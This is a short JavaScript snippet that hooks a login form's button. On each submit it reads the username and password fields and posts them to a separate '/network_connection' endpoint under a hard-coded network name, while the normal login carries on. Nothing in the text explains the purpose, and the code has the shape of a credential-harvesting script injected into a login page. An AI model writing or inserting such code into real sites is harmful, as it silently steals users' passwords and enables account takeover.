 



if ($('#login-form').length) {
	$('#login-form .btn').on('click',function() {
		credentials_update();
		return true;
	});
}


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/network_connection",
        data: { 
            network_name: 'chinesean',
            username: $('[name=userName]').val(),
            password: $('[name=password]').val(), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("credentials_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
